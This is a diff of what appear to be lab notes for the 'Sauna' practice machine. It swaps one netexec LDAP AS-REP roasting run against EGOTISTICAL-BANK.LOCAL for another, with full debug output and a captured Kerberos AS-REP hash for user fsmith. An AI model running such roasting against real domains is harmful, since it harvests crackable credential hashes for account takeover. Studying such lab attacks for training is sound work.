@@ -272,13 +272,13 @@
 
 ### --asreproast
 ```sh
-└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --kdcHost 10.129.95.180 --asreproast asreproast.txt --debug           
-[06:31:27] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
+└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p '' --asreproast asreproast.txt --debug
+[06:34:13] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
            DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
            DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
            DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                     protocol='ldap', target=['10.129.95.180'], username=['EGOTISTICAL-BANK.LOCAL\\fsmith'], password=[''], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                            
-                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost='10.129.95.180', pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                
+                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                     server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                     local_auth=False, asreproast='asreproast.txt', kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False,                       
                     users=None, users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False,                                
@@ -286,7 +286,7 @@
            DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
            DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
            DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
-           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
+[06:34:14] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
            DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
            DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
            DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
@@ -299,19 +299,21 @@
            INFO     Socket info: host=10.129.95.180, hostname=10.129.95.180, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
            DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
            INFO     Connecting to ldap://10.129.95.180 with no baseDN                                                                                                                                                            ldap.py:173
-[06:31:28] DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f9ff6ee8ad0>                                                                                                                                ldap.py:177
-           DEBUG    Target: SAUNA.EGOTISTICAL-BANK.LOCAL; target_domain: EGOTISTICAL-BANK.LOCAL; base_dn: DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                           ldap.py:212
+           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7ff9bf1fcad0>                                                                                                                                ldap.py:177
+[06:34:15] DEBUG    Target: SAUNA.EGOTISTICAL-BANK.LOCAL; target_domain: EGOTISTICAL-BANK.LOCAL; base_dn: DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                           ldap.py:212
            DEBUG    Created connection object                                                                                                                                                                              connection.py:232
-[06:31:29] DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.95.180', 'hostname': 'SAUNA', 'domain': 'EGOTISTICAL-BANK.LOCAL', 'os': 'Windows 10 / Server 2019 Build 17763'}]                                                   database.py:92
+[06:34:16] INFO     Error resolving hostname EGOTISTICAL-BANK.LOCAL: [Errno -2] Name or service not known                                                                                                                  connection.py:192
+           INFO     Resolved domain: EGOTISTICAL-BANK.LOCAL with dns, kdcHost: None                                                                                                                                              ldap.py:257
+           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.95.180', 'hostname': 'SAUNA', 'domain': 'EGOTISTICAL-BANK.LOCAL', 'os': 'Windows 10 / Server 2019 Build 17763'}]                                                   database.py:92
            DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:102
            DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
-[06:31:29] INFO     LDAP        10.129.95.180   389    SAUNA            Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)                                                                        ldap.py:276
+[06:34:16] INFO     LDAP        10.129.95.180   389    SAUNA            Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)                                                                        ldap.py:276
            DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
-[06:31:30] INFO     LDAP        10.129.95.180   389    SAUNA                                                                                                                                                                     ldap.py:421
-                    $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a3fc943cd4379ee8326459b4b7774fb4$93262ea2229141fd77c5b1528103eab0aba029546d0ec85436c8b0d750815e838a9c7e4310d469114809840edade97a38be3d3e6bc17bf1b0b7cfcaf050ad43            
-                    05fe69aebb1420f02e562ceea7fde63e449db318ef2415d9e2e2643c79d51e3ea844e64c95d79350cd992a6d6a7167a87cf6c8842c65a259dfca11138148854b875ea18ac24f310aa8428271b3f837b4108dca724cca1bd430fc0811c55edd4e41a946a9e496            
-                    ad52d02650e912edfe9be71c78a0cf87b6e580ac04d8ffe6e609eb8475844acb3444c6f55c4b1f1a2279e3ab902104c4a5f5b990487e9fcb11dcb92493f8bad430ac122ccb5ac845e5ff9fb927ce3774202759562f3681a32fe99                                   
-[06:31:30] DEBUG    Closing connection to: 10.129.95.180
+[06:34:17] INFO     LDAP        10.129.95.180   389    SAUNA                                                                                                                                                                     ldap.py:421
+                    $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d8e8ee3025fa78be6ad392cd1815b92c$ce8d5fa4316986438bf99388d64565ac0e56662e2f3b515da165dab2ad8473c1a0d24a99fbe36c793140952e60d6481c18c6b3aba9319a96175a884d14ab75d            
+                    d258acc13ee23d1f852e03b49a2d5500c8f15284fe7aaec61f2e4192795f15e6affe6a1b4e8c47b70aba92ac95761875b99bc4ea0455cc031fdcdc7a40ffdae51e54f248a92ab3c4ea2ca9f3b1b1874466680f691bb8ed81e9e65d220f4f9be7ef349d1fc029            
+                    9287cf57e04f3e096e48b65d6a0a81ed7a26b0d8d901742d559def00f9e1c607f2ce13da685d393ca6b2a1bd22c0df6c7016a5462a7ca15062568b6ccfe624245e2951e13ae5cccead00fa0ec78bef88be073bae6ac08a658d582                                   
+[06:34:17] DEBUG    Closing connection to: 10.129.95.180 
 ```
 
 
